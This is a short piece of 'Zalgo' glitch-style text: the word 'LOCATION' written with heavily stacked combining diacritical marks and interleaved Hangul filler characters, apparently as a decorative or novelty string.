̵̡̛̮̤̜̠̮͚̞̖̲̹̺̯͈̮̪̪̳̬͖̹̩̟̲̱̥͇̣̠̠͕̟̗̩͙̺̫̫̝̮͕̯͓̮͈͇͚̰͊̍͌̓̃̊̇̽̐̿̄̅̀̓͋͐̾̽̈́̽̆̿͑͐͊͊́́͒̃̈̇̀̆̅̆̔̿̌̓̈́́͊̆͆̂̓̅͗̈́̾̐̓̇̌͑̂̾̈́̈́̌̑̏̀̉͋̀̈́͋͗̀̚͘̕̕͘͜͠͝͠͝͠͠͝ͅᆞ̵̧̡̨̨̨̨̧̛̛̛̛̛̜͖͔̠̮̰̲̰̳͕̖̤̙̥̹̼͎̪̜͖̟̙̬͕̘̟̠͙͇̩̲̫̠̖̗̦̬̣̺̣̼̪͓̜̰͉͔͉͓̱͇̱̜̭͍͓͙̳̪̫͚̩̤̰͎͇͎̘͎̲̫̯̭̱̻͓̪̲̪̙̮̺̰̘̳͈͙̱̟̬̜̠̬͖̻͈̰͓̰̘͉̖̖̯̲͔̪̯͍̼̩͖̜̙͔͕̞̘͍̗̺͔͇͖̖̖͚̲̘͙̫̀͗͛̈̐͒̎͗̐̀͆̓̎̌̅͗̀͂́̐̽͑̈́͆͋͐̒̈̑͐͐̎̊̉̄̋̈́͋͊̍̌͑͐̇̂̔̓̇̏̈́́̾̾͌̎̐̂́̎̾̈́̾̈́̏͘͘̚͘͘͜͝͠͝͠͠͠ͅͅL̸̨̢̨̧̢̨̧̧̨̧̧̡̡̢̧̧̡̢̹͉̰͇̰̤̲͎͈̩̼̥̙͖̰̳̹̺̺̱̖̞͕͍̠̰̞̞̰̙͚̰̺̪̹̼̥̬̙̪̮͍͈̞̞̩̮͓͈̗̟͉̳̣̟̮̩͈͎̘̠͖̗̟̟͖͓̯̠̺͍͕̳͍̥̥͙͈͓̩̣̤͖̰̖̣̹̹̤̠̩̫͕͖͕͈̝̰͙͍̮̱̟̬̩̦̻̬̜͇͓̜̮̮̗̗͖̬͇̙̞̗͍̘̺͕̥̦̣͕̱̯̝͉̹͍͕̱͉̂́͌̈́̆̓̃͊̏̌̈́̅͒̍̾̐̇̅͂̈́͌̔̂̋̏͗͜͜͝͠͠ͅͅͅͅͅͅᆞ̸̢̡̡̨̨̢̧̨̡̢̡̢̢̢̡̧̧̡̢̡̧̨̨̨̢̡̧̨̨̨̡̨̧̢̧̛̛̛̛̛̛̛̗̩̭̳̩̳̯̭̪̬̜̙̟̱͉̹̲̖̰͍̮̩͍̰̘͙̟̬̞̳͔̘̜̞̗͉̪͖͈̳̩͈̞̮̱͖̫̜͇͕͎̜̱͙̠̖͚̝̤͚̱͈̳̺͓̲̻̞͙̟̻̩͓͚̩̖̰̟̟̲̩͔̱̗̼͉̻͇̣̫̪͓͖͖͈̝͔̟̺͙͓̗̗̝̻̣͓͎͉̬̯͎̤͕̬͖̳̺̮͍͇̲̪̮̠̻͚͖̪̯̲͉̜̩͍̥̻̫͖̦̝̥̤̤̖̼̥̙͖̺͓̤͔̦̝̱̰̜̱͖͖̮͈͕̻̳͔̻̙̱͕̰͇̹̗͚̼͚̭̖̭̻͚͓̣̤̖̪̤̺̪͎͇̤͖̤̪͈̗͍̪̭͎̪̰̜͇͚̭͔̼̰̩̞̳̼̱̙̣̮͔̬͇͚̼̝̖͇̟̳̥͚̗̞̘͋̏̉̈́̐͊̌̌̔͐̓̅̆͑̉̒̄̀̊̈́̈́̐̇͗̅̈́̑͊̇̊͌̆̈́̀̇̔̿͑̆͌͑̄͆̃̅͌͊̾̉̅͌̍́̋͊̎̋͋̋͊͗̀̊̾̉̈̅̇̅̿̔̍̽̒̽̍̌͐͊́̑̒̄͗̑̑̿̈̏̊̀͐̄͂͆͋͑̄͌͆̃̇̽̐̍̌̈́̂̈́̌̽̈́̿́̇̀̌̅͂̿̒̊̂͛̐́͑̄͋͑͊̍̌̂̋̐͂̑̄̎̊̃̍̇̎̔̉͒̚̕͘̚̕̚̕͘͘̕̚͘̕͜͜͜͜͜͠͝͠͠͝͝͠͠ͅͅͅͅͅᆞ̷̡̨̡̨̨̢̡̡̨̨̡̡̧̢̢̛̛̛̛̝̼͕͈͍̞̠̜͍̯̯̭̟̦̜͖͕͎̳̺̲͎͔͈̘͉͙̖̻̠̟̪͈̯͈͙̤̰̘̯̠̦̟̥͎̜̬͔̜̖͈͍̗̮̺͉̗͙͚̥̞̗̻͕̱̤̘̪̪͓͍̙̩̺̲͕̩͍̖̱͍̙͙̖̫̲̫̼͇͇̳̤͇̲͓̠̠͖̫̰̼̜̙̬̺̰̱̗̙͇̻̱̯̺͉̠͚͉̯̝̗̹̤̲̏̂̓́͑͐̄̌́̄̓̾̇͗̊͆̏̆̈͗̎̎͌̓̀͒́̽̑̍̂́́̎͂̓́̂͒̂̄̑̒̿́͋̅̏̋̌̐͌̊̑̐̎̀̀́͊̌̑̂́̅̒̔̆͆̍͒͋́̀̊̌͌̍̇͂͌̅͛̽̒̓̏̋̌̌̾̇͆̆͌͂́̑͆̐̋̇̇̿̏͛̀̓͛̈́̀̈́̈̈̀͑̀͂̈́̏̒̓͋̋̉̿̈̇̊̒͗̀͐̇̑͛͆͐̔̒͐̍̋̀̍̃́̓̓̐̌͋̎̽͒̔͛͆͛̉̅̓͋̃̆̆́̅̍̀̈́͌̑̓̀͂̈́̎́́̐̊̐̽͐̈̅̈̏̌̐̊̈́͌͛͘͘͘̕̕͘̚͘͠͝͠͝͝͠͠͠͝͝͠͝͝͝͠͝͝͝ͅͅͅͅͅƠ̵̧̧̧̨̧̧̡̡̧̢̧̨̨̨̧̢̨̢̢̡̢̢̡̨̨̧̢̛̺͕̳̹̗̲̱̙͎̥̥̼̭̥̟͇̮̺̥͖̹̖̗̘̰̘̞̲͕̗̣̣̭̳̟͍͇̪̠̗̱̻̫̬̖̳͇̺͉̳̘͎͍͚̙̲̖͚͖͙̣͍̙̠̱͎͖̼̜̦̲̻̙̮̞͙̩͖̪̖̼̜̮̤̲̠͎̪͈̝̩̻̤͚͉͍̲͉̤̪̠͙̱̫̬͖͖̭̬̣̟̻͓̗͇͚͖͇̪̣͇͍͍̼̟̰͚̳̻̱̖̦̠͇͍͍͖̘̘͙̹̘̤͎̤̭̟̱̹̣̠̪͈̝̠̩̯͖͖̺̠̟̙͚̹͇̼͚͕̣͕̲̪̭̞̱̯̰͓͔̻̠̱̻͈̩̙̘͎̮̝͓̬͍̼͕̟̼͙͓͍͙̜͉̺͔̱̹̯̪̗̰̥̯̫͉͓̭̤͕̮̝̘̭̺͍̺̮͉͉͎̙̘̠͍̙͖͚͌̓̾̏̈́̿̆̋̍͑̈́̽̉̿̈́̽̏̀͋͗̍̅͋͆̓̾̎̐͌̆͒̂̂͛̍̍̈́͋͗͋̃̐͌̈́̍̐̆̌̌̉̊̎͛̓̒͑̍̈͂́̃͛̈͌̆͋̔̐̆̅̔̎͐̊͗̒͗̀́̑̾̍̔͐̋́̓̓̔̈́̾̓̓̔̋̅̑̂́͋͊̈̌̈͋̆̔͆̈́̑̑̉̀̚̚̚̚͘͜͜͜͠͝͝͝͝ͅͅͅͅͅͅͅᆞ̵̡̡̧̧̡̢̨̨̢̡̨̧̧̧̡̢̨̢̢̧̡̨̡̧̻̫͈̠̣̝͎̖̹̺͚͕̖̳̺̦̭͕͉͕͉̜͓͚̟̣̞̩̜̤̯͍͈̗̲̜̩̤̩̺̰̬̳̣͍͍̘̯̣̤̮̯̠̗̘͇̗͖̭̥̰̝̣̫̞̬̹̺̬͕͉̰̣͍̞̖̣̤̖̻̹̼̟̟̘͔̱̙̹̱͔̬͎̖̩͙̯̩̥͉̳͍̩͔̝̟̖̝̥̜̝̳̪̹̩͙̜̱̩̮̻̱̪͉̭̘̱̥̞̹͈̲̠͖̝̰̻̼̘̖̝̘͙͓̣̭͔̥̥̼̦̹̠̩͈͍͈̳̺̣͓͓̰̬̤̲̥̩̱͚̪̠̺̦̘̠͓̖̜̖̭̹̼͙͓̭͖̰̖͕̼̞͕͎̬̩͇͔̭̻͙̞̤̬̫̣̘̼̼͈͇̼̖̺̫̙̠̙͈̥͕̣̜͉̣̯̭͚̜̯̻̹̥̲͙̥̞̲̓̂̎̄̇̑̔̌̈́̒̊̀̾̉̎̕͜͜͜͝͠ͅͅͅͅͅͅͅᆞ̵̧̧̨̢̨̡̢̨̡̧̡̨̨̡̡̢̢̧̨̨̡̛̛̫̰̙͈͈̦̯̙̙̬̤̤̲̳͙̞͇̥̻͇̦͕͉̗̠̬͓͙̝̦̯̳͙͎͈̹̼͙̞̞̗̼̗̺͕͕̠̳͔͖̝͎̬͇͙̩͎̲͈̫̱̥͈̹̦̜͓͎͎͉͍̱̞̭̦̩̱̮̜̮̟͍̺̮̳̭͎̺͇͇̦̝̟̱̙̰͈͍̺͇̯̭̥̥̦͚̘͚͙̼͕̹̪̲̪̱͚̹͙̤̤͎̜͓̣͓̗̘͕͙̘̹̘̞̖̰͖̩̗̰̪̪̝͉̼̱̜̬̻̭̙̗̙͔̺̮̺̠̯̫̥͉̦̖̫̲̳̹̤̭̱̮̗͈̼̤̻̹͇̭̟̜̳̣͕̬͖͓̖̗̤̠̲̞̙̲̜̖̖͚̬͉̯͖͖̼̣̦͕͔̣̭͖̮̻̠̝̗̹̟̮̫̘̳̻͙̩͚̰̺̯̤͕͉̭̻̯̝̺̼̘̐̾͆͋͒̊͂͊̑̑̈̐͗̔̐̾̀͋̂̾̎͊̀͗͆̂̾͛͐͂̇̄̾̄̓̓̐̈̈́̉̓̈́̑̈́͌̊̈́̈́́̅̐͊͆͆̑̆̉̓̓̉̀̏̀́͐̂͂́̓͛̓̅́̍͂͘͘̕̚̕̕̚͜͜͜͜͜͜͜͜͝͝͝͝ͅͅͅͅͅͅC̷̢̛̛̛̛̛̛̛̛̛̠̟̫͖̪̿̇̅̋͛̆̆̓͊͆͐̄̍̇̆̾̀̎̾̈͆̈́͑͛̾͊̓̀̍̉̓̀̎͋͌̔͒̆̌͋̒̌͛͊́̋̐̅̓̅̽̅̑̒̉͌̑̓͊̊͊̌̐̋͋͂̽̔̿̌̂͋̽̈́̌͂͐͂̈́̄̌̈́͋̍̌͋͊́͂̿͌́̀͊̿̈̀̂̽̈́̈́̅̀̉̑͊͂̈́͋͑͗̃͂͗͛̇̍̌̓̀̏̑́̔̃̓̈́͆́͋̈́͑̒͐̇͌̔̐̀̐̍̽̓̈́̎̎͊̾͛͊̓͐̋͒̒̽͗̊̀̀̽̉͐̀̈́́̏̄̃̏̅̀̃͊̈́̈́̃̔̄̾͑͆̄͆͂́̈́̐̈́̆͌̅̕̚̕̕̕̕̚̕͘̕̚̕͠͠͝͝͝͝͠͝͠͠ͅᆞ̷̡̡̡̢̨̢̛̩̺̰͓̜̲̙̮̤̱͓̻̫͙͓̘͔̟̮̫͚̲͖͈͙̤̠͎̘̥͕̭̼̗̘̖̳̠̦͕͚̝̺̟̦̤̫̣̣̳̜̣͓̱̘̹̟̲͕͍̦̣͚̘̤̈́͊̋͊͌͋̄̎̌̿̀̐͒̂͌̀́͛̓͑͋̿̑̋͗̿̅̐̀̒̇̎̔̀̈́̍̊̾͑̀̌̿̋̉̂̈́̈́͆̈̃̿̆͑̔̾͌̐̈́́̑̉͒̒̆͑́̔͐̉̆̈̎̈́̇͆̑̔͂́̑̑͒̐̀̑̂̎́̆̓̉̀̍̇̇̚̕̕͜͜͠͠͠͠͝͝͝ͅᆞ̴̢̡̧̢̢̢̨̨̛͈̗̣͚͔̪̝͎̫̺̯̺̭͓̬͚̰̭͈̰̠̦͕̘̟̱̬̯̲̦̭͇͎͎̲̞̮̝͈͕̗̻͎̱̼̳̻̦͓͚̭͈͎̰̪̖͍̗̬͓̤̙͉̙̣̱̹̯̖͈̩̳̪̺̖̞̗̯̩̻͖̩̱̱̮̫̥͕̟͕̤͔̻̠͇̣̦̣̩͕͖̝̞̜̯̜̦̭̥͓̣̬̥̖̪̼͍̪͊͆̍̇̈́̎͛͐͂̄͒̔͋̄͒̽̓̒̏͊͊͑̔̃̓́̎̑͛͊̔̈́̌̑́̈́͐̾́̔̿͐́͐̍͌́͒̉̊̎̏͛̆̐̂̎͑͛͗͛̍̊̽̿͋͆̾͗̐̅̇̾̆̇̑̇́̊̾̍̏̇̉̌̿̂́̑̇͂̀̍̍̊́̾͗̂͐́̈́̆̇͌̒́̏̅͂̾̈̅̎̉̇̈́̍̋̈̊͘̕͘͘͘̕̚͘͜͜͜͝͠͝͠͝͠͝͠͝͠͝͠͠͠ͅĄ̶̧̧̧̡̧̡̧̡̡̧̨̢̧̧̧̧̧̡̛̯̞̤̰͈̭͇̹̘̦̯̲̩̜͖̘̭̹͓̲̲̭͖̜̭͕̠̳͕̥̭̗̮͈͔̦̗͖͈̬̼̝̱͙͓͈̗̮͚̼̫̝̣̰̪̪̘̝̰̦͎̦͇̙̻̠̟͇̞̦̭͈̱̖͓͔̥͉̬̣̠̘̟͕̞͔̤͇͕̘̻̖͈̳̺͔̳͇̙̼͎͍̮͈͇͔̠̞̖͙̰̥͕͔͍̻͉͇̪͉̝̔͋̍͒̒̈͗͊̈́͌̇̃̂͒̃͗͂̃̍͐͜͜͜͜͜͜͝ͅͅͅᆞ̷̡̨̡̨̢̡̢̧̡̢̢̢̧̢̢̡̡̧̡̨̡̛̛̛̛̛̛̼̩̮̭̰̞̹̫̝͍͎̥̗͈̲͔̲̘͔̻̫̝̖̦͖͖̯͙̣̱̲̗̭̗̝͖͎̤͓̹̙̠͚͔͎̖̱̣͔̻͕̥͚̖̦͇͉͎̪̬͇͚͎̩̳͓̝̘̳̮͕̘̫̻̹̞̙̫̦͚͉̙͚̣͖̰̭̖͉̗̱̲̘̜̫͇͚̖͈̰̝̤͚̣͔̪̺̳̱̤͍̪̥̠̠̻̝͈̹̬̞̬̪͕͔̘̲͖͍̳͇̣̲̜͚̩̰̤̻͉̭̞̤͎̺͚̗̟̝̫͕̬̼̣̪̤͇̩͇̝͕̠͓̘̖͉͎̜͖̜̳̖̰̦̠͚͉͖̖̬̟̮̦̠͔̯̼͓̱͖̱̫̭̤͔̰̻̙̫̬̮̳̭͎̟̭̯̙̭̩̖̩̼̻͎̮̗͎̝͙̖̠͙͚̙̣͔͙̞͕̤̰̖̖̭͚̰̲̳̜̼̤͍͚̙̦͕̣̰̝̲͈̫̦̲̰̜̯͍̟̠̀̍̄̏̀͒͌͆́͂͆̓̆̃̔̀̄͗͊̍̈́́̅͆̌̈̇̏̃̇̎̀͗̆͂͛̐̍̃̑̓̈́͌̈́͌̈́̊̐̽͗́̿̆̇̑͆̋͒͌͒̀͑͐̊̓̃͑͌̅̈́́͋̈́̏́̿̊̅̐̂̎̏͋͆̐̌̌̑͋̀͒́͂̊̋̃̑̊́̀͋̓͑̃̾͑́͒͒̒̓̈́̈́̐̊̋̇̍́̊͐͐̎͛̏̈́͆̅͒̅̐̈́̿̐̐͆̑͆́̆̑̈́́͊́̊̐͒̊̾́̀͋̿̚͘̚̕̕̚̚͜͜͜͜͜͜͠͝͝͝͝͝͝͝͠͠ͅͅͅͅᆞ̶̡̨̨̢̡̢̢̢̨̨̨̡̧̡̛̛̛̛̯̘͎̩͙̠̺̞͓̳̯̣̰̩͉̞̘̱̖̹̳͓̘̱̳̘͈̟͉̳̝̲̫̤̖̜̜͕̬͓̦̩̫̙͙̥͖͙̹̝͎̻̪̻̭̩͇̜̙͓͈̞̹̺̣͉̭̜̪̦͔̳̩̮̥̺̳̞͓̪͙͓̙͓͈̞̹̦̙̲͕̣͈̯̻͈͕̟̻͙̞̥̼̰̰̬̺̗͎͖̤̞̤̞̹̙͚̞͍̱̦̰̻̜̹͙̘̳̹̘̠̰̼̰͕̲̪̲̘̻̜̣̥͔̣̮͖͇͇̖̜̰̻̲̜̯̖͇̝̹̳̣̳̠͉̻͎̻̖̰̫̘͕̠̬̲̱̤̪̟͓̳̻̺̤̻̦͍͈̳̱̦̲͕̱͍̻̖̲͈͔͉̲̣̠̤̜͙͍͍̩̲͚̖͈̳͈̻̪̮̗̪̰͍̥̲̻͔͕̟̻̱̎͂̊̍͌͆̿̃̈́͆̎͐̄̑̿͆̀̊̆̄̓̈̈́̾͋̂̋̊͌͆̂̓̎͛͒̀̉̊̈̈̅͛͐͒̇́̇͊͒̑͂̍̇̌̆̾̌̎̉͋̆̎͛͋͛̀́̊̀̀̉̀̎̑͌̆͛̀́́͆̂̒̈́̑́̀̊̽̍͛͆̄̑͌̇̔́͌̊͒͋̉͌́͗͒̃̔̄͌̓̇͐̽̃͐͂̽̈́̏̾̌͒́̈̅͊̋͗̋̏͌̏̈́̿̓͛͗͗͂̅͗̔̉̓̃͂͒̆̈́͑̽͊̅͗̉͑̄̏͌͌̈̋̓̉̉̂̓̆̌́̐̈́̉̿̌̎͊͛̔̐̓̈́͆̀̒̑͗́̌́̾̀̄̏̉̑͆͊̏̾̍̉͆̋́͊̏͒̒̃̔̊̂̑͑̂̂͐̈́̈́̊̔̋̐͒͑̑̋͒̔̋̈̾͐̅̋̉̅̎̈́͌̕͘̚͘͘͘͘̕̕̚̚͘̕̚͘͜͜͜͜͝͝͝͝͠͠͝͠͝͠͠͝͠͠͠ͅͅͅͅT̶̡̢̧̡̢̨̧̡̧̧̨̧̢̡̢̨̧̢̧̧̨̨̡̨̧̢̨̢̧̛͈̲̜̼͙͇͇͔̱̳͍͕̳̖͎̼̯̘͎͕͓͍͎̼̻̳̗̝̬̼̞̣̲̹̥̼͚̹̻̠͍̼͎̜̲̳̫͔͉̠̳̜̘͕͙̰̙͍̬̱͖̤͍̲̙͎͔̱̗̮̮̺͎͔̪̟̝̮̱̘̳̹͓̲̜͍͇͕̝̟̠̳͖̻̤̹̱͔̱͕̟̙̻͕̤͕̫̙̘̗̭̰̜͔̯̮͓̤̰̳̝̠̞͚͕̮̼̤̱̥͎̝̪̹̟̘̺͖̲̼̣͎͔̪̺̩̹͉̤̮̳̜̟̣͈̟͓̖̼̣̙̪̬̪̻̠̙̱̹͎̣̗̩̩̼̗͚̰̟̯̳̫̜͉̗̦̹̖͈̮̳͙͕̠̞͇͓̼̗̼̠̲̪̬̤̤̠̳̙͕̯̜̙͉̥̩̼̫͉̮̹͕̞͉͇͈͕͎̹̙͕̻͖͕͔̯̣̻͉̼̪̺̲̳̰̼̹̦͓̜͙̬̪͉̖̳̋̇̍̆͛̈͂̄̽̏̇̌̍̃̂̍̈́̊̌̌̃̔͂͌̈́͑́͒̈́̒͆́̉̎͗̑̀͒́͋̅̃͌̌͂͐͋̌̅̎̇̃͑̈́̉̿̓͋̏̇͊̈́͛̃̉̊̀̄̆̈́̃̓̾͂̽͊̓̋͛̉̈̈́̆̑͂̅̔̀͌̑̀͐̉̈́̓͐͊͒̍̅̓̎̈͐͊͗̕̕͘̚͘͘͘͜͜͜͜͜͜͜͝͝͝͠͝͠͝ͅͅͅᆞ̴̨̨̨̨̡̢̢̢̡̡̨̡̡̨̢̧̡̛̩͈̫̼̠̜̞̠̦̠͓̠̤̟͇̯̻̭͓̭͕͉͈̖̳͎͚͎̠̰͖̟̳̘̬̮̙̝̬̰̳̲̝̙͚͕͖͇̘̪͉̼̼͉̪̜̟̞̹̼̼̼̗̦̲̦̟̘͔̲̗̬̙̗̫͖̟̻̝̣̜̺̳͇̯̗͚̙͎͙̯̞̯̙̫̹͙͚̟͎͚̣̬͎̹͍͈̪̯̞͚̭͚͚͔̰͎̰̘̱̺͚͇͍̘̦̗̼̟͚̞̟̰͚̙͍̫̠̫̪̠̬̟͇̘͎̲̭̙̤͚͖̩̮͉̲̪̣̞̩̞̹͎͚͍̜̫̞̥̳̭̯̰͍͉̜̟̜̟̝͎͕̻̞̩̻̬̼̱̭͉͖͚̖͓͇͇̘̫̺̫͈̣̝̠̼̥̋̀̈̑͑͐͊͆̾̈̈̒̏̌͌̾̌̅̎̂͌͂͌͐͆̉̓̃̈́̎̽͆́̌̒͌̀̆͗͌̆̾̿͑̂̋̒̇͊̔̾͐́̆͌̈͐̓̐̈̋̇̋͊̈̾̌́̉́̌̎̈͗̄̈͗̈́̏̉͌̓̑̏̒̅͒͆̑͊̈́̐̿̈̀͐̋͐̽́̾́͒̍͗̓͛́͒̈́̐̌͊̽̂̀̊̓̊̈́͊͋̈́̄͋̽͊̐̈́̿̎̈́̍̓͛̆̈́̐̊̽̆̽́̿̐́̽̍̔̀̃̾̋͆̈́̈̏̇̈́̉̆̅̽̽̒̈͛̑̍̌̾̾̂̀̂̀̅͛̃̽̿̾̚̕͘̚͘̚͘̚̚̕̕̚̚̕͜͜͜͜͜͜͜͝͠͝͝͝͠͝͝͠͝͝͝͝͝͝͝͝ͅͅͅͅᆞ̵̡̧̨̨̧̡̨̧̡̧̢̧̨̢̡̨̡̢̢̨̡̧̢̨̡̢̧̧̛̛̛͕͎̺͍͎̫̭̞̺͔̭̹͈̲͈̤̰̫̲̺͖̱̣̮̙̹̘̟͇͇̖̗̯̣̙͔̖̖̳̙̠͖̱̣̘̺͙̙̯̠̹͚̩̞̜̺̠̮̬̦̯̺̲͚͎͓͇͈̩̝͇͔̰̝͕̘̬̭̖͉̝̼̝̣͓̼̖̭̫͈̦̟̙̜̮̪̪̫͇͚̜͎̮̣͎͚̖̫͔̳͇̗̼̦͈̭̮̙̭̖͈̘̱͖̦̲̲̳̱͈͍̹̦̣̼͕͔͈̝̻̘̞̲̥̥̞̖̗̩͕̼̬̞͓̦̫̩̳̫͚̮͎̮̗̘͇̗̹̳͚͍̱͓̥͉̙̬̙̭̪̪̖̩͔̳̟̤̻͙̦̬͈̣͎͍̖̻̖̪̻̩̖͙͚͇̤̟͚͎̮̖͈̻͉̣̟͕̥̱͕̩͙̲͕̱̼̹͓̥̠̝͇̖̪̹̜̮̝̣̞̖̦̟͉̰̖̪̣̺͙̙̮̪͚͔̱̙̼̽̿͒͆̋̃͗̿̓̆̔́́͑͊̑̾̄͐͒͂̅̂́̆͒̽̋́̈́̏̿͑̿̈́̿̀͑̎̏̌̂̈̾̋̒͒̐̊̾͛͆̊̃̀͌̓̈́̌͗̽̾̔͑̔͛͐͒͛͆̇̆͊̓̋̇̈́̃̔̒̈̑͗̍̆̆̑̌̓͐͐͘̚̕͘̕͘̕͘̚̕̚̚̚̚͜͜͜͜͜͜͜͝͝͝͝͠͝ͅͅͅͅͅͅI̶̧̨̡̨̨̢̧̢̢̡̢̢̨̧̛̛̛͔̝̤͙̬̼͕͈̯̦̰̘̯̝̮͓̭͎̞̳̙͙̭̯͎̲̞̼͚̼̩̩̬͚̝̥̰̠͓͈͍̲͉̦̬͍͚͔̮̱̪͉̲̹̠͔̖͍̥̫̠̳̞̺̞͇̺͖̞̭͈̪͎̟͉̪͔̣̣͚͕͎̼̳̘͎̜̗̺̦͓̱̻͈̞̠͔̯̬͚̩̯̮͎͚̼̥̝̩̯̮̙̯̰̮̰̦̣͇͎̺͎̤̖̟̳̥̖̗̥̜͓͉̫̺͎͙̘̙̰̙̗̣̥͈͚̣̝̩͙̠͙̬̟̘͇̣͖̽̐̓͐́̈̉͌̐͆̓̂̀̎̐͗̏̆̀̌͆͋̀̍͐̏̂͂̽̎̋̈́̌̅͆̋͐̈́̊͊̀͒͌̓̌̀̊̂̀̔̇̒̑͛͌͂̋̒͋̀̄̌̈́̏̀̔̑̈́̔̍̉̅̈́̀̐͒̈̓̌̓͗̀͒̂̈́̅̀̾͑̃̈́̂̉̽̒̑̒̇̉͂͊̌̏͗̀̅̃͌͌̂́̈́̉͌͒̈́͌̈͐̆̽̆̐̏̉̔̾̀̆̈́̒̈́́̎͐̾́͗͒̂͑̒̉̀̋̿̀̊́̆̈́̿͂̈́̍͌̋̎̌͆̑̈́̓̒́͑̎̌̾̏̊̍͋̍͆̾͛̾̽̈̓͐̀̎̽̓̑͗̅͒̋̅̈̌͒́͐͐̈́̾̈́̀̆́̌̎̋̓̀̿́͊̎͆͊̆̐́̃̂̐̂̐̀̍̈́͊̊́̊̋̔͗͒͗́̋͐̈̆͊̋͛̇͆̒̄̈́̓̚̕̚̕̕̕͘͘̕̚͘̕͘̕̕͘̕̚̚͜͜͜͠͝͝͝͝͠͠͝͠͠͝͝͝͝͝͝͠͝͝ͅͅͅͅͅᆞ̸̢̨̢̧̨̨̡̡̧̧̡̡̧̢̛̛̛̛̛̛̛̛͇͚̮̮̺̼̰̗͍͓̣̹̥̥̣̠͔̪̫͎̮̺͉̖͇̘͉̲̬̙͙̩̗̝͈̗͚̱̟̘̪͓̬͍̺̗̞͙̙̬̹̭͇̱̮͉̞̜̲̟̲̟͉͚͚̱̰̙̦̗̝̗̮̬͓̰̞̬̼̞̟̲̗̬͚̦̮͕̹̜̥͙͉̟̠͓̫͔̞̺̞͙̣͔͓̹͖̫̭̫̦̝͖̙͚̭̘͈͈̪̤̤̙̰͚̤̺̱̖̖̥̘̙̮̠̺̩̜̞̜͔̝̪͚̻̥͈͉̲͇͈̪̩̫̱̩̱͚͎̘̣̮̖̬̘̥͓͓̥͎̣̗̖̺̣͖̯͕̳̣͙̌̂̌̐̐͂̌̊̀̒͂̉̐̀̂̒̑͗͛̐̀̏͂͐̃̐͆͒̃̊͒̔̀̂̓͛̑́̈́̀́͋͋̄͑́͑̔̓͐͑̿̎̎̓̿͌͑́͋̈́̿͛͑̌̈̇̊̆̄̂͑́͌̑̊̂͗̂́̾̍̾̌̀̑́͋́̆̓̀̀̓͌̎̇͋̓̎́̅̎̈́̉̌̂̾̌̔͊͑̓̈́̋͗̆͂͐́͑́̀͂̈́́͗̾̈́́̆̇̿̿͗̅̎͑̍̎̅̍͒̓̓̎̓̔͋͘̚͘̚͘̕̕̚̚̚̕̚̚̚̕͘͜͜͜͜͜͜͝͝͠͝͝͠͠͝͠͝͝ͅͅͅͅͅᆞ̷̢̛̛̛̳͉͍̘̞̫͔͚͇̪̬̹̟̭͍͎͓̦͑̒̋͒̈̏͗̔͒͒̑̽́͐͂͆̃̂̂͐͛͋̾̋́̆̑̀͋̂̅̽̒̃̾͑͐̎͑͛̉̆̒̀̌̍̔͛̂̀̍̒̅̈̂͊͐̽̏͋̉̃̆̆͒̓̿̿͋̀́̉̔̐̀̔̒̿͌̐̓̀̾̒̐̌̈́͊̀͗̄͗͑̑̌́̔̀̕̕̕̚̚͘͝͝͝͝͝͝͠͝Ơ̶̢̡̧̧̛̛̛̛̬̟̘͓̗̝̺̺̫̺͇̫͇̫̠̤̗͍̫̜̩͇̯̻͕̖̮̙̱̤͚͎̟͍̦̙͈̟̦̱̖̠̦̮̗͖̭͚̪͕͎͉̥̥̞͖͓̳̩̺͇͎͋̈́̅̈̅̔͂͋̇͐̔̈́͗̔̈́̃̃̌̌́͑̌̉̀̆̽̓̊̈́̀̈́̑̾̌̍̑̂͋͑̄͂͑̈́́̋́̑̈́̉̄͑̊̓͊̈́͆̒̅͒̇͊́͗̂͐̈́̾̀̂́̄̿̋͒̓͌̅̎̑̎͒̈͑͛̐̂͑̈́̃̓͗̆̇̍̀̈́͊̓͂͛̃̈̅͛̍̍̋̈́̌͗͌̍͆͆͆͐̐̈͒̈́͑̾͋̊́̊͂̀̏̀͌̍͒̔͛̾̒̉͂̊̏̅̾̑̓̂̀͑̂̈́͌̇̊͊̅̂̿̌̾̆͆́̀̐̂͗̋̆̀̀̌̓̑̈́̿̆̀̒͌̓̉́̇̀͊̾̓͛͗͋̎̈͑͌͑͘͘͘͘̚̚̕͘͘̕͘̕̚͝͠͠͠͝͝͝͝͝͠͠͠͠ͅᆞ̴̧̡̢̧̨̡̧̧̨̧̧̢̢̡̨̡̡̡̡̡̛̛̛̛̛̛̛̘̺̹̯͙̗̩̖̻̼̺͎̮̬̟̭̰͔̞̻̜͙̥̞̗̖͔͖̺̼͉̯͈͙͕̘̲̙̼͈̫̞̜̰͔̖̮̦̙̻̬̩͇̖̮͕̭̪̤̘͈̖̩͍̩̰̪̯̠͕̻̖̩͈͚̣̜̭͙͖͉̪̙̠̼̝̺̪̯̣̭̞͎̤͕͔̯̞̤͖̘̹͈̤̖̺̖͎̼͙͚͚̲͇̺̙͎̰̳̞͓̲̜̲͈̩̟͎̞̙͚̪̳̭̳̟̥̱̤̲̤̼͙͇̼̯͚͖̜̯̟͖̮̬͔͔̬͙͎͖̤͍̤̥̫̗̥͈̜̼̝͉̮̹̰̦̺̠̣̘̲̪̗̯̪̻͇͍̱̙̮̯̹̜̥͕̳͓͓̗̖̹̮̫̫͍̲͔̺͔̰̪͉̮̦͔̜͖̤̯͔̠̺̖̥͚̤̥̣̗̲͇̻̤̹̞̫̙̼̑͊̿̆͒͗̀̆̀̾͐̽̏̈̒̈̉͐̀́̈̌͗̈́͋̏̀́̀͌͒̐̾͐̀̃̿̔̐͑̃̓́̇̒̃̓͑̑̆̾̆̓́͌̒̔͗̓͒̽̊̽̑͋͌̐̓͑̀̈̈́̈́̃͋͒̅̍̏͊̅͂̽̔͑̈́̋̎͌͌̈́̈̊͋̑̎̅̃͋̿͛̌̂̊̓̽͒̑́͆̉͗̀̎̅́̎̒͋̒̊͊̋̾͂̆̈́̓̀̀̈́̓́̆́͆́̋́̍̉̆͛̔̈́͆͐̍̒́̒͋̇̃̚͘̕̕͘̚̕̕̕̕͘͘͜͜͝͝͠͝͠͠͝͝͠͝͝͝͝͠͠ͅͅͅͅͅͅᆞ̶̛̛̛͊͋̏̀̆͗̄͋̽̀̏̅̓̒̽̑̈́̽̏̎́̋̃̆͊̆̐̍̓̆͊̆̉̑̐͛̄͋͑̽́̍̇͂̆͐̆̎̒̓̍̌̀̎̋̐̌̋̂̑̆̀̏̍̊͌͒̈́̃̇̉̾͛̇̃̃͒̑̀̔̌̂̄͌̽͂̓͋̋̄̔̈̈́̊͛͒̈́͌̒̄̈́̔̌̚͘̕͘͘͘̚̕͠͠͝͠͝͝